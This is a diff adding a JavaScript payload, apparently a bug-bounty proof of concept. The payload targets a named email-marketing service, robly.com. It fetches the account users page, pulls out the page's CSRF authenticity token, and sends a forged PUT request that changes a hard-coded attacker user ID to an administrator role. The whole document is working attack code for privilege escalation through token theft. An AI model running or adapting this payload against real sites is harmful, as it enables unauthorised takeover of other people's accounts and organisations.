@@ -1,0 +1,13 @@
+var req1 = new XMLHttpRequest();
+        req1.onload = handleResponse;
+        req1.open('get','/my_account/users',true);
+        req1.send();
+        function handleResponse() {
+        var authenticity_token = encodeURIComponent(document.getElementsByTagName("input")['authenticity_token'].value);
+        alert('authenticity_token = ' + authenticity_token);
+        var becomeAdmin = new XMLHttpRequest();
+        // This sends the post request with the attacker's ID to become admin
+        becomeAdmin.open('post', 'https://www.robly.com/my_account/update_user_type?id=41154', true);
+        becomeAdmin.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        becomeAdmin.send('utf8=%E2%9C%93&_method=put&user%5Brole_id%5D=6&commit=Save&authenticity_token='+authenticity_token)
+        };
